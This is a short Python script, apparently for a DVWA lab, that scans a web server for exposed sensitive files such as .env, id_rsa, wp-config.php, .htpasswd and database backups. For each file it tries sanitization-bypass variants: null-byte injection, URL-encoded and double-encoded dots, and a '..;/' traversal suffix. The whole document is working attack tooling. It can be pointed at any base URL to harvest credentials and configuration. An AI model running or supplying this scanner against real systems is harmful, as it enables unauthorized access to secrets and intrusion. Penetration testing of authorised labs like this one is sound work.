import requests

def bypass_sanitization(filename):
    # Attempt various bypass techniques
    bypassed_filenames = [
        filename,
        filename + '%00',  # Null byte injection
        filename + '/',  # Trailing slash
        filename + '%2e%2e',  # URL encoded dots
        filename + '..;/',  # Directory traversal
        filename.replace('.', '%2e'),  # URL encoded period
        filename.replace('.', '%252e')  # Double URL encoded period
    ]
    return bypassed_filenames

def check_sensitive_files(session, base_url):
    sensitive_files = [
        '.git',
        '.env',
        'config.php',
        'db_backup.sql',
        'backup.zip',
        'wp-config.php',
        'web.config',
        'docker-compose.yml',
        '.htpasswd',
        '.htaccess',
        'id_rsa',
        'id_rsa.pub',
        'database.yml',
        'settings.py',
        'secrets.yml'
    ]

    for file in sensitive_files:
        bypassed_filenames = bypass_sanitization(file)
        for bypassed_file in bypassed_filenames:
            response = session.get(base_url + bypassed_file)
            if response.status_code == 200:
                print(f"Sensitive file accessible: {base_url}{bypassed_file}")
            else:
                print(f"Sensitive file not accessible: {base_url}{bypassed_file}")

# Example usage
if __name__ == "__main__":
    session = requests.Session()
    base_url = "http://127.0.0.1/DVWA/"  
    check_sensitive_files(session, base_url)
